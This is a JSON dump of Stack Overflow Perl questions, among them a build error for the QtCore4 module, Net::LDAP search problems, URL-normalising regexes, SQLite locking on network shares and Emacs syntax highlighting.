\"GET /%7Edist/programs/PhD/PhDGuide/guideA.htm HTTP/1.0\" 200 19090\n74.6.74.184 - - [28/Jan/2007:00:00:12 -0500] \"GET /%7Embsclass/hall_of_fame/myicon.ico HTTP/1.0\" 200 760\n58.68.24.3 - - [28/Jan/2007:00:00:16 -0500] \"GET /~dtipper/tipper.html HTTP/1.1\" 200 5896\n58.68.24.3 - - [28/Jan/2007:00:00:16 -0500] \"GET /~dtipper/gifs/head.jpg HTTP/1.1\" 200 18318\n</code></pre>\n"},{"tags":["python","perl","unit-testing","nose"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":13150963,"title":"How can we extend Test::Harness \"prove\" to have features like nosetest (Python) or vice versa","body":"<p>Here are some of the features provided by nose:</p>\n\n<ol>\n<li>nose supports fixtures (setup and teardown methods) at the package, module, class, and test level.</li>\n<li>In addition to passing command-line options, you may also put configuration options in your projectâs setup.cfg file, or a .noserc or nose.cfg file in your home directory. </li>\n<li>There are numerous nose plugins available via easy_install and elsewhere. To use a plugin, just install it. The plugin will add command line options to nosetests.</li>\n<li>--verbosity=VERBOSITY option</li>\n<li>--testmatch=REGEX command line option</li>\n<li>--debug=DEFAULT command line option</li>\n<li>--log-config=FILE </li>\n<li>--ignore-files=REGEX</li>\n<li>--exclude=REGEX</li>\n<li>--include=REGEX</li>\n<li>--attr=ATTR Run only tests that have attributes specified by ATTR [NOSE_ATTR]</li>\n<li>--with-coverage</li>\n<li>--cover-min-percentage=DEFAULT</li>\n<li>--cover-xml</li>\n<li>--cover-xml-file=FILE</li>\n<li>--no-deprecated</li>\n<li>--with-id</li>\n<li>--with-xunit</li>\n<li>--collect-only</li>\n<li>nose allows tests to be grouped into test packages. </li>\n<li>provides a few convenience functions to make writing tests easier. </li>\n<li><p>nose includes a number of builtin plugins that can make testing faster and easier.\n <a href=\"https://nose.readthedocs.org/en/latest/plugins/builtin.html\" rel=\"nofollow\">built-in plugins</a></p></li>\n<li><p><a href=\"https://nose-plugins.jottit.com/\" rel=\"nofollow\">nose's 3rd party plugins</a></p></li>\n<li><p><a href=\"https://nose.readthedocs.org/en/latest/plugins.html#writing-plugins\" rel=\"nofollow\">How to write plugins for nose</a></p></li>\n</ol>\n\n<p>Now as for prove:</p>\n\n<p>Test::Harness provides a command, prove , which runs a TAP based test suite and prints a report.</p>\n\n<ol>\n<li>Attributes\nAfter command line parsing the following attributes reflect the values of the corresponding command line switches. They may be altered before calling run .</li>\n<li>archive</li>\n<li>argv</li>\n<li>backwards</li>\n<li>blib</li>\n<li>color</li>\n<li>directives</li>\n<li>dry</li>\n<li>exec</li>\n<li>extensions</li>\n<li>failures</li>\n<li>comments</li>\n<li>formatter</li>\n<li>harness</li>\n<li>ignore_exit</li>\n<li>includes</li>\n<li>jobs</li>\n<li>lib</li>\n<li>merge</li>\n<li>modules</li>\n<li>parse</li>\n<li>plugins</li>\n<li>quiet</li>\n<li>really_quiet</li>\n<li>recurse</li>\n<li>rules</li>\n<li>show_count</li>\n<li>show_help</li>\n<li>show_man</li>\n<li>show_version</li>\n<li>shuffle</li>\n<li>state</li>\n<li>state_class</li>\n<li>taint_fail</li>\n<li>taint_warn</li>\n<li>test_args</li>\n<li>timer</li>\n<li>verbose</li>\n<li>warnings_fail</li>\n<li>warnings_warn</li>\n<li>tapversion</li>\n<li>trap</li>\n</ol>\n\n<p>Some questions/Wish list:</p>\n\n<ol>\n<li>How can we ensure that tests run in alphabetical order, in prove ?</li>\n<li>How can we have prove results in XML/xUnit Style , so it can be rendered by Jenkins</li>\n<li>How can we have decorators / Annotations in prove like in Junit 4.x, or <a href=\"http://testng.org/doc/documentation-main.html\" rel=\"nofollow\">testng</a></li>\n<li>Provide extended assertions like <a href=\"https://github.com/easytesting/fest-assert-core.git\" rel=\"nofollow\">FEST</a></li>\n<li>prove to provide some examples on how to write plugins, which actually work (other than foo/bar type examples)</li>\n</ol>\n"},{"tags":["perl","qt","cmake","cpan","qwt"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13099181,"title":"Perl QtCore4 won't install","body":"<p>I can't build the QtCore4 package, I get an error regarding \"SMOKE_QWT_LIBRARY\" not being set during make. I'm running perlbrew Perl 5.14.2 on Ubuntu 12.04. I've tried manually building the module as well as through CPAN, and also installing on system Perl (also 5.14.2) and perl 5.16.1. I've looked in the files in the directory referenced in the error message. The file CMakeLists.txt contains the reference to \"SMOKE_QWT_LIBRARY\" but there is no directory reference or obvious way to re-configure the file (and I'm not sure what to reconfigure it to!).</p>\n\n<p>Can anyone help with this please?</p>\n\n<p>This is the make output:<br>\n    Running install for module 'QtCore4'\n    Running make for C/CB/CBUREL/Qt4-0.99.0.tar.bz2\n    Checksum for /home/sillymoose/.cpan/sources/authors/id/C/CB/CBUREL/Qt4-\n    0.99.0.tar.bz2 ok</p>\n\n<pre><code>  CPAN.pm: Building C/CB/CBUREL/Qt4-0.99.0.tar.bz2\n\n-- The C compiler identification is GNU\n-- The CXX compiler identification is GNU\n-- Check for working C compiler: /usr/bin/gcc\n-- Check for working C compiler: /usr/bin/gcc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Found Perl: /home/sillymoose/perl5/perlbrew/perls/perl-\n5.14.2/bin/perl \n-- Found PerlLibs: /home/sillymoose/perl5/perlbrew/perls/perl-\n5.14.2/lib/5.14.2/x86_64-linux/CORE/libperl.a (found version \"5.14.2\")\n-- Looking for Q_WS_X11\n-- Looking for Q_WS_X11 - found\n-- Looking for Q_WS_WIN\n-- Looking for Q_WS_WIN - not found.\n-- Looking for Q_WS_QWS\n-- Looking for Q_WS_QWS - not found.\n-- Looking for Q_WS_MAC\n-- Looking for Q_WS_MAC - not found.\n-- Found Qt4: /usr/bin/qmake (found version \"4.8.1\")\n-- Found QScintilla2: /usr/lib/libqscintilla2.so\n-- Found QImageBlitz: /usr/include/qimageblitz \n-- Phonon Version: 4.6.0\n-- Found Phonon: /usr/lib/x86_64-linux-gnu/libphonon.so\n-- Found Phonon Includes: /usr/include/qt4/KDE;/usr/include/qt4\n-- Found Qwt: /usr/lib/libqwt-qt4.so\n-- Perl headers found: /home/sillymoose/perl5/perlbrew/perls/perl-\n5.14.2/lib/5.14.2/x86_64-linux/CORE\n-- Perl headers found: /home/sillymoose/perl5/perlbrew/perls/perl-\n5.14.2/lib/5.14.2/x86_64-linux/CORE\n-- Build PerlQt bindings: \nPhonon;QImageBlitz;QScintilla;Qt3Support;QtDBus;QtDeclarative;QtGui;QtHe\nlp;QtNetwork;QtOpenGL;QtScript;QtSql;QtSvg;QtTest;QtUiTools;QtWebKit;QtX\nml;QtXmlPatterns;Qwt\n-- Skip PerlQt bindings: QtMultimedia\n\n------------------------------------------------------------------------\n-----\n-- The following external packages were located on your system.\n-- This installation will have the extra features provided by these \npackages.\n------------------------------------------------------------------------\n-----\n   * QScintilla2 - QScintilla2 libraries\n   * QImageBlitz - QImageBlitz library\n   * Phonon - Phonon multimedia framework\n   * Qwt5 for Qt4 - Qwt5 libraries for Qt4\n\n------------------------------------------------------------------------\n-----\n-- Congratulations! All external packages have been found.\n------------------------------------------------------------------------\n-----\n\nCMake Error: The following variables are used in this project, but they \nare set to NOTFOUND.\nPlease set them or make sure they are set and tested correctly in the \nCMake files:\nSMOKE_QWT_LIBRARY (ADVANCED)\n    linked by target \"perl_qwt\" in directory \n/home/sillymoose/.cpan/build/Qt4-0.99.0-5Qxy7L/qwt/src\n\n-- Configuring incomplete, errors occurred!\nNo 'Makefile' created  CBUREL/Qt4-0.99.0.tar.bz2\n  /home/sillymoose/perl5/perlbrew/perls/perl-5.14.2/bin/perl Makefile.PL \n-- NOT OK\n</code></pre>\n\n<p>And this is the contents of ~/.cpan/build/Qt4-0.99.0-5Qxy7L/qwt/src/CMakeLists.txt</p>\n\n<pre><code>include_directories(\n    ${CMAKE_SOURCE_DIR}/qtcore/src\n    ${PERL_INCLUDE_PATH}\n    ${QT_INCLUDES} )\n\n# Run doxsubpp.pl to run xsubpp on Qwt.xs\nadd_custom_command(OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Qwt.c\n                   COMMAND ${PERL_EXECUTABLE} ARGS ${CMAKE_SOURCE_DIR}/qtcore/src/doxsubpp.pl ${PERL_EXECUTABLE} Qwt.xs ${CMAKE_CURRENT_BINARY_DIR}/Qwt.c\n                   DEPENDS ${CMAKE_CURRENT_SOURCE_DIR}/Qwt.xs\n                   WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}\n)\n# Make sure we build Qwt.c as c++ code\nset_source_files_properties( ${CMAKE_CURRENT_BINARY_DIR}/Qwt.c \n    PROPERTIES LANGUAGE CXX\n)\n\nset( CMAKE_CXX_FLAGS ${PERL_CXX_FLAGS} )\n\nset(qwt_LIBRARY_SRC\n    ${CMAKE_CURRENT_BINARY_DIR}/Qwt.c\n    qwthandlers.cpp\n)\n\nif(WIN32)\n    set(libraryName PerlQwt)\nelse()\n    set(libraryName Qwt)\nendif(WIN32)\n\nset(LIBRARY_OUTPUT_PATH ${CMAKE_BINARY_DIR}/blib/arch/auto/${libraryName})\nadd_library(perl_qwt SHARED ${qwt_LIBRARY_SRC})\n\ntarget_link_libraries(perl_qwt\n    ${SMOKE_QWT_LIBRARY}\n    perlqtcore4)\n\nset_target_properties(perl_qwt PROPERTIES OUTPUT_NAME ${libraryName})\nset_target_properties(perl_qwt PROPERTIES PREFIX \"\")\n\ninstall(TARGETS perl_qwt DESTINATION ${CUSTOM_PERL_SITE_ARCH_DIR}/auto/${libraryName}/)\n</code></pre>\n"}]}
{"total":22324,"page":4,"pagesize":100,"questions":[{"tags":["perl"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":489,"score":4,"question_id":2367785,"title":"Getting stack traces in Perl?","body":"<p>How do i get stack traces in perl?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":91,"score":1,"question_id":13145491,"title":"How to iterate array elements inside a filehandle loop in perl","body":"<p>Here is what I have:</p>\n\n<pre><code>open INFILE,    \"&lt;\",    \"$inputfile\";\nopen OUTFILE,   \"&gt;\",    \"$outfile\";\n@array = qw{ Element1 Element2 };\n        if ( ! open INFILE, \"&lt;\", \"$inputfile\") {\n                die \"Cannot open INFILE: $!\";\n        }\nwhile (&lt;INFILE&gt;) {\n         if ($_ =~ m/(str1)|(str2)/sg) {\n              chomp;\n              $regex = $_;\n                   foreach $list (@array) {\n                            print OUTFILE \"\\$list is $list\\n\";\n                            print OUTFILE \"String is $regex\\n\";\n                    }\n          }\n}\n\nclose INFILE;\nclose OUTFILE;\n</code></pre>\n\n<p>What I am getting is:</p>\n\n<pre><code>\\$list is ELEMENT 1\nString is str1\n\\$list is ELEMENT 2\nString is str1\n\\$list is ELEMENT 3\nString is str1\n</code></pre>\n\n<p>I want this output:</p>\n\n<pre><code>\\$list is ELEMENT 1\nString is str1\n\\$list is ELEMENT 2\nString is str2\n\\$list is ELEMENT 3\nString is str3\n</code></pre>\n"},{"tags":["perl","url"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":170,"score":0,"question_id":9603756,"title":"URL Regular Expression with Perl","body":"<p>I need to normalise my URL before I store it in the database using Perl regular expressions.</p>\n\n<p>Here are some example URLs:</p>\n\n<ul>\n<li><a href=\"http://www.codeme.com:80/foo/../index.php\" rel=\"nofollow\">http://www.codeme.com:80/foo/../index.php</a></li>\n<li><a href=\"http://www.codeme.com:123/../foo//bar.html\" rel=\"nofollow\">http://www.codeme.com:123/../foo//bar.html</a> </li>\n</ul>\n\n<p>However, whenever I try the below code, instead of just removing the <code>//</code> after foo in\n<code>foo//</code>, it will also remove the double slash in <code>http://</code>. I need to keep the <code>//</code> in <code>http://</code>, but I donât need the forward <code>//</code> after the <code>foo//</code>. I also need to get rid of all the <code>/../</code> or <code>/./</code> that can appear any where in the URL.</p>\n\n<p>Basically, this:</p>\n\n<pre><code>\"http://www.codeme.com:123/../foo//bar.html\"\n</code></pre>\n\n<p>Should become this:</p>\n\n<pre><code>\"http://www.codeme.com/foo/\"\n</code></pre>\n\n<p>I am very new to Perl I always ignored it and thought that i will never need it however life has proven me wrong. I therefore would really appreciate your help if you can lead me to the right track.</p>\n\n<pre><code>sub main\n{\n        my $line;  \n        open(FH, \"test.txt\");\n\n        until(($line = &lt;FH&gt;) =~ /9/) {\n\n           $line =~ tr/A-Z/a-z/;\n\n           $line =~  s|//|/| ;\n\n           $line =~  s|\\:\\d\\d\\d|| ; \n\n           $line =~  s|:80||;   \n\n            print $line;   \n        }\n\n        close FH;\n}\n</code></pre>\n"},{"tags":["perl","text-manipulation"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13144647,"title":"How do I count the times a text string occurs in Perl?","body":"<p>I am trying to count the occurences of a text string.\nMy Perl code below prints a statement (text string) when it finds certain types of files and I need to count up the times it prints the string.</p>\n\n<pre><code>elsif ($elt =~ /DELETE_.+\\.XML/) {\n    print \"  &lt;-- Delete XMLs !!\";\n}\n</code></pre>\n\n<p>I am just trying to learn perl and I am not a programmer! So please explain any answers.\nI don't want to insert, sort or merge, just count.</p>\n"},{"tags":["perl","ldap"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":44,"score":3,"question_id":13141333,"title":"Unable to process a perl LDAP search","body":"<p>This is my first question on StackOverFlow so please let me know if I have done something wrong. </p>\n\n<p>I am writing a perl script to perform an LDAP search to identify the list groups that a user is a member of. I read the perldocs on the subject and found a few examples on this website but I have been unable to get the script to run properly.</p>\n\n<p>Here is my code:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Net::LDAP;\n\nmy $ldap;\nmy $ldapuser = \"MVS\\\\user\";\nmy $ldappass = \"passw0rd\";\nmy $searchbase = \"DC=dom,DC=site,DC=labs,DC=domain,DC=net\";\nmy $attrs = \"sAMAccountName, sn, givenname, memberOf\";\nmy $filter=\"(samAccountName=user)\";\nmy $result;\n\n# ensure the ldap connection is made\nprint \"Connecting to LDAP...\\n\";\n$_ = $ldap = Net::LDAP-&gt;new('dc1.mvs.cso.labs.rim.net')     or die \"$@\";\n\n# ensure the bind is successful\nprint 'Binding....';\n$_ = $ldap-&gt;bind (\"$ldapuser\", password=&gt;$ldappass, version=&gt;3);\nprint $_-&gt;error_text();\n\n\n$result = $ldap-&gt;search(base=&gt;\"$searchbase\", filter=&gt;\"$filter\", attrs=&gt;[$attrs]);\n\nmy $max;\nmy $i;\nmy $entry;\nmy $first;\nmy $last;\nmy $login;\nmy @memberOf;\n\n$max = $result-&gt;count;\nprint \"Count: $max\\n\";\n\nfor ($i=0;$i&lt;$max;$i++) {\n$entry = $result-&gt;entry($i);\n$last = $entry-&gt;get_value('sn');\n$login = $entry-&gt;get_value('sAMAccountName');\n@memberOf = $entry-&gt;get_value('memberOf');\n\nprint \"$first $last\\n\";\nprint \"$login\\n\";\nprint \"@memberOf\\n\";\n\n}\n$ldap-&gt;unbind;\n$ldap-&gt;disconnect;\n</code></pre>\n\n<p>Here is the result when I run this code:</p>\n\n<pre><code>Connecting to LDAP...\n\nBinding....Operation completed without error\nCount: 1\nUse of uninitialized value $first in concatenation (.) or string at ./ldap_test.cgi line 43, &lt;DATA&gt; line 604.\nUse of uninitialized value $last in concatenation (.) or string at ./ldap_test.cgi line 43, &lt;DATA&gt; line 604.\nUse of uninitialized value $login in concatenation (.) or string at ./ldap_test.cgi line 44, &lt;DATA&gt; line 604.\n</code></pre>\n\n<p>From what I can tell it seems to me that $entry is not getting any value returned when I run: </p>\n\n<pre><code>$entry = $result-&gt;entry($i);\n</code></pre>\n\n<p>but I could be wrong.\nAny help would be appreciated.</p>\n\n<p>Thanks,</p>\n"},{"tags":["arrays","perl","sum","rows"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":13143303,"title":"Alter code to sum values from multiple files","body":"<p>Curious if I can get a little help here.  I'm a perl newbie, and can't figure out how to convert the following code into something a bit more useful for my analysis.</p>\n\n<p>This code presently takes the 1st and 4th column from a user supplied list of data files and puts them together.</p>\n\n<p>What I'd like my code to do, for each row of the \"current output\" generated by this code (see below), is make a sum of these 4th column values (filea, fileb, filec).  Not quite sure how to implement this...</p>\n\n<p>Current Output:</p>\n\n<pre><code>filea   fileb  filec\n\nentrya  | 0 |10.2 | 0\nentryb  | 0 | 0.0 | 1     \nentryc  | 8 | 57.0| 46       \n</code></pre>\n\n<p>desired output</p>\n\n<pre><code>         sum\nentrya | 10.2\nentryb | 1\nentryc | 111\n</code></pre>\n\n<p>current code looks like this:</p>\n\n<pre><code>main: {\n\n\nmy %data;\n\nforeach my $file (@rsem_files) {\n\n    open (my $fh, $file) or die \"Error, cannot open file $file\";\n    my $header = &lt;$fh&gt;; # ignore it\n    while (&lt;$fh&gt;) {\n        chomp;\n        my @x = split(/\\t/);\n        my $acc = $x[0];\n        my $count = $x[4];\n        $data{$acc}-&gt;{$file} = $count;\n    }\n    close $fh;\n}\n\nmy @filenames = @rsem_files;\nforeach my $file (@filenames) {\n    $file = basename($file);\n}\n\n\nprint join(\"\\t\", \"\", @filenames) . \"\\n\";\nforeach my $acc (keys %data) {\n\n    print \"$acc\";\n\n    foreach my $file (@rsem_files) {\n\n        my $count = $data{$acc}-&gt;{$file};\n        unless (defined $count) {\n            $count = \"NA\";\n        }\n\n        print \"\\t$count\";\n\n    }\n\n    print \"\\n\";\n\n}\n\n\nexit(0);\n}\n</code></pre>\n"},{"tags":["perl","automation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13144579,"title":"Is it possible to configure before run_test to only do the setup for certain tests?","body":"<p>I am using Test::Routine and using this function to do the setup before running a test</p>\n\n<pre><code>before run_test =&gt; sub {\n    #do something\n    pass(\"before\");\n  };\n</code></pre>\n\n<p>However, can i have the setup to happen only for certain tests and not all ?</p>\n\n<p>Following is the test file</p>\n\n<pre><code>use Test::More;\nuse Test::Routine;\nuse Test::Routine::Util;\n\ntest login_test =&gt; sub { pass(\"login is okay\") };\ntest login_first_time =&gt; sub {pass(\"first time login detected\")};\ntest login_wrong_password =&gt; sub {pass(\"detected the incorrect password\")};\ntest login_incorrect_username =&gt; sub {fail(\"incorrect username not detected\")};\n\n\nbefore run_test =&gt; sub {\n    #do something\n    pass(\"before \");\n};\n\nrun_me;\ndone_testing;\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13057727,"title":"Packages are not recognized in Perl","body":"<p>I have created build script in search way it will place all project dependencies inside target folder. This target folder will be inside the project root directory. This target folder contains bin,lib folder. Inside lib folder all dependencies are there.</p>\n\n<p>I have set path search as:</p>\n\n<pre><code>export PERL5LIB=\"$PWD/target/lib/perl5:$PWD/target/lib/perl5/x86_64-linux:$PWD/targer/lib/perl5/x86_64-linux-gnu-thread-multi\"\n</code></pre>\n\n<p>When I build my project it is throwing following errors.</p>\n\n<blockquote>\n  <blockquote>\n    <p>Can't locate Clone.pm in @INC (@INC contains: lib /home/smopuru/pigeon/target/lib/perl5 /home/smopuru/pigeon/target/lib/perl5/x86_64-linux /home/smopuru/pigeon/targer/lib/perl5/x86_64-linux-gnu-thread-multi lib /home/smopuru/pigeon/target/lib/perl5 /home/smopuru/pigeon/target/lib/perl5/x86_64-linux /home/smopuru/pigeon/targer/lib/perl5/x86_64-linux-gnu-thread-multi /home/smopuru/pigeon/target/lib/site_perl/5.14.2/x86_64-linux /home/smopuru/pigeon/target/lib/site_perl/5.14.2 /home/smopuru/pigeon/target/lib/5.14.2/x86_64-linux /home/smopuru/pigeon/target/lib/5.14.2 .) at lib/Pigeon/Compiler.pm line 29, &lt;> line 1.</p>\n    \n    <p>Can't locate Mouse.pm in @INC (@INC contains: lib /home/smopuru/pigeon/target/lib/perl5 /home/smopuru/pigeon/target/lib/perl5/x86_64-linux /home/smopuru/pigeon/targer/lib/perl5/x86_64-linux-gnu-thread-multi lib /home/smopuru/pigeon/target/lib/perl5 /home/smopuru/pigeon/target/lib/perl5/x86_64-linux /home/smopuru/pigeon/targer/lib/perl5/x86_64-linux-gnu-thread-multi /home/smopuru/pigeon/target/lib/site_perl/5.14.2/x86_64-linux /home/smopuru/pigeon/target/lib/site_perl/5.14.2 /home/smopuru/pigeon/target/lib/5.14.2/x86_64-linux /home/smopuru/pigeon/target/lib/5.14.2 .) at lib/Pigeon/Compiler.pm line 29, &lt;> line 1.</p>\n  </blockquote>\n</blockquote>\n\n<p>I am sure these two files are available. The commands that i used to search for:</p>\n\n<pre><code>find target/lib/ -name Clone.pm target/lib/perl5/x86_64-linux-gnu-thread-multi/Clone.pm\nfind target/lib/ -name Mouse.pm target/lib/perl5/x86_64-linux-gnu-thread-multi/Mouse.pm target/lib/perl5/x86_64-linux-gnu-thread-multi/Test/Mouse.pm\n</code></pre>\n"},{"tags":["perl","shell","sed","awk"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":13139469,"title":"extract a substring of 11 characters from a line using sed,awk or perl","body":"<p>I have a file with many lines, in each line\nthere is either substring</p>\n\n<pre><code>whatever_blablablalsfjlsdjf;asdfjlds;f/watch?v=yPrg-JN50sw&amp;amp,whatever_blabla\n</code></pre>\n\n<p>or </p>\n\n<pre><code>whatever_blablabla\"/watch?v=yPrg-JN50sw&amp;amp\" class=whatever_blablablavwhate\n</code></pre>\n\n<p>I want to extract a substring, like the \"yPrg-JN50s\" above</p>\n\n<p>the matching pattern is \nthe 11 characters after the string \"/watch?=\" </p>\n\n<p>how to extract the substring</p>\n\n<p>I hope it is sed, awk in one line\nif not, a pn line perl script is also ok</p>\n"},{"tags":["perl","mechanize"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":83,"score":-1,"question_id":13093448,"title":"Passing Variables in an Array","body":"<p>I have the code below which is supposed to click and go to each link with the text... What is happening is that <code>$l</code> stays the letter A, and collects the page for A 26x ... Any ideas?</p>\n\n<pre><code>my $mech = WWW::Mechanize-&gt;new();\n$mech-&gt;get($info-&gt;website);\n\nmy $te = HTML::TableExtract-&gt;new();\nmy @abc = (\"A\" .. \"Z\");\n\nforeach my $letter (@abc){\n\n$mech-&gt;find_link(text =&gt; $letter);\n$mech-&gt;follow_link(text =&gt; $letter);\n\n$content = $mech-&gt;content();\n\n$te-&gt;parse($content);\n\n$table = $te-&gt;first_table_found;\n\n$str .= Dumper $table;\n\n$mech-&gt;back();\n}\n</code></pre>\n"},{"tags":["perl","sqlite","sqlite3"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":42,"score":3,"question_id":13139309,"title":"DBD::SQLite issue with I/O errors over mounted filesystem","body":"<p>Consider the following Perl code:</p>\n\n<pre><code>#!/usr/env/ perl\nuse strict;\nuse warnings;\nuse DBI;\n\nmy $filename = 'moo.sqlite';\nmy $dbh = DBI-&gt;connect(\"dbi:SQLite:dbname=$filename\",\"\",\"\");\nmy $sql = 'INSERT into moo values (1)';\nmy $sth = $dbh-&gt;prepare( $sql );\nmy $rv = $sth-&gt;execute();\nprint $rv;\n</code></pre>\n\n<p>produces this error when run:</p>\n\n<pre><code>DBD::SQLite::db prepare failed: disk I/O error at test.pl line 16.\nCan't call method \"execute\" on an undefined value at test.pl line 18.\n</code></pre>\n\n<p>The SQLite file is located on a SMBFS/CIFS network mounted share. </p>\n\n<p>I have done some tracing and it appears that the failure occurs when a lock is attempted on the file:</p>\n\n<pre><code>open(\"moo.sqlite\\0\", 0x202, 0x1A4)       = 3 0\nfcntl(0x3, 0x1, 0x0)         = 0 0\nfcntl(0x3, 0x2, 0x1)         = 0 0\n</code></pre>\n\n<p>While I understand that network locking is problematic, wouldnt the same problem occur when interactively running the 'sqlite3' binary? Currently, I am able to work on the file with no problems when I do so. </p>\n\n<p>Is this something that DBI is causing?</p>\n\n<p>For your info:</p>\n\n<ul>\n<li>OS OS X 10.6.8</li>\n<li>SQLite version 3.7.13 </li>\n<li>Perl 5.12.4</li>\n<li>DBI 1.622</li>\n<li>DBD::SQLite 1.37</li>\n</ul>\n"},{"tags":["arrays","perl","multidimensional-array"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":13133587,"title":"pushing array inside array perl","body":"<p><strong>edited:</strong></p>\n\n<p>How can I push @myarr into $menu (see below) </p>\n\n<pre><code>my @myarr = (\n                [ \"itemone\", \"itemoneb\", \"itemonec\" ],\n                [ \"itemtwo\", \"itemtwob\", \"itemtwoc\" ],\n                [ \"itemthree\", \"itemthewwb\", \"itemthreec\" ],\n                [ \"itemfour\", \"itemfourb\", \"itemfourc\" ]\n               );\n\n$menu = [\n         \"List\",\n         [\"itemone\", \\&amp;ds2],\n         [\"itemtwo\", \\&amp;ds2],\n         [\"itemthree\", \\&amp;ds2],\n         [\"itemfour\", \\&amp;ds2],\n         [ \"Do Something (second)\", \\&amp;ds2 ]\n     ];\n</code></pre>\n"},{"tags":["perl","optimization","subroutine","mason"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":125,"score":4,"question_id":13137968,"title":"Perl: show used subroutines","body":"<p>In some project ( Mason ) there is a lot of perl modules (> 200). Really used only 5-10% from this code.\nHow i can look, which subroutines is used (or unused)?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":64,"score":1,"question_id":13136000,"title":"stripping off numbers and alphabetics in perl","body":"<p>I have an input variable, say <code>$a</code>. <code>$a</code> can be either number or string or mix of both.</p>\n\n<p>My question is how can I strip off the variable to separate numeric digits and alphabetic characters?</p>\n\n<p>Example;</p>\n\n<pre><code>$a can be 'AB9'\n</code></pre>\n\n<p>Here I should be able to store 'AB' in one variable and '9' in other.</p>\n\n<p>How can I do that?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13139168,"title":"Can't figure out this perl string replace","body":"<p>I want to convert every occurrence of <code>\"\\\\192.168.0.2\\\"</code> with <code>\"q:\\\"</code></p>\n\n<p>So far I've come up with:</p>\n\n<pre><code>perl -i.bak -pe 's/\\\\\\\\192.168.0.2\\\\/q:\\\\/' report.txt\n</code></pre>\n\n<p>This doesn't change anything in the file.  I could use some guidance!  Thanks</p>\n\n<p>sample:\n file type  processed   10/29/2012 9:08:58 AM   \\\\192.168.0.2\\reports\\ report.xls</p>\n"},{"tags":["perl","pointers","split"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13136856,"title":"Using split in perl with pointer to a structure","body":"<p>Given the following piece of code:</p>\n\n<pre><code>($a, $b, $c, $d ) = split(' ',$trav-&gt;{'Lptr'})\n</code></pre>\n\n<p>Lptr is a pointer to a structure. \nThe structure has 6 elements of which 3 are also pointer to structures.</p>\n\n<p>I am unable to understand the usability of split here. What would be the output of this code, what is assigned to a,b,c &amp; d ? </p>\n"},{"tags":["perl","apache","module","cgi"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":13139693,"title":"Running perl scripts like php without CGI","body":"<p>Is it possible to run Perl script in web server without using CGI?<br>\nI mean, like php scripts (run any .pl file without <code>#!/path/to/interpreter</code> line).<br>\nIf Yes, How?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13136357,"title":"the unexpected behavior of smart match operator in perl","body":"<p>according to perlop:<a href=\"http://perldoc.perl.org/perlop.html#Smartmatch-Operator\" rel=\"nofollow\">Smartmatch-Operator</a>,the following code:</p>\n\n<pre><code>use 5.012;\n\nmy @array = qw/1 2/;\n\nprint @array ~~ 2\n    ? \"true\"\n    : \"false\";\n</code></pre>\n\n<p>should use the rule</p>\n\n<blockquote>\n  <p>Left      Right      Description and pseudocode<br>\n   ===============================================================</p>\n  \n  <p>Any       Num        numeric equality(like: Any == Num)</p>\n</blockquote>\n\n<p>but the output is \"false\".but I think </p>\n\n<pre><code>@array == 2\n</code></pre>\n\n<p>should be true.Where do I go wrong?</p>\n"},{"tags":["perl","emacs","cperl-mode"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":13138932,"title":"Syntax highlight for perl in Emacs is broken, is there a fix?","body":"<p>I'm a perl programmer and a new emacs user. I'm under Windows, using cperl-mode for editing perl. Emacs version is 24.2.1. Here's a screenshot with some sample code:</p>\n\n<p><img src=\"http://breqwas.net/dropbox/perlsyn_emacs.png\"></p>\n\n<ol><li>Obvious bug: it highlights arrays, hashes and non-quoted literal values in ( a => \"b\" ) style lists <i>inside comments</i></li>\n<li>One more bug: it highligts the first word in a regular expression as an array because of non-default quote symbol</li>\n<li>Not a bug, but looks weird: it highlights arrays and hashes any time when they are used (even in comments, huh), but scalars are highlighted only when declared</li>\n<li>Not a bug, but looks weird: same story with functions: highlighted when declared, not when called</li>\n<li>Not a bug, but looks weird: why do \"print\", \"say\" and \"system\" have different colors?</li></ol>\n\n<p>I could keep going, but I hope that explains the word \"broken\" 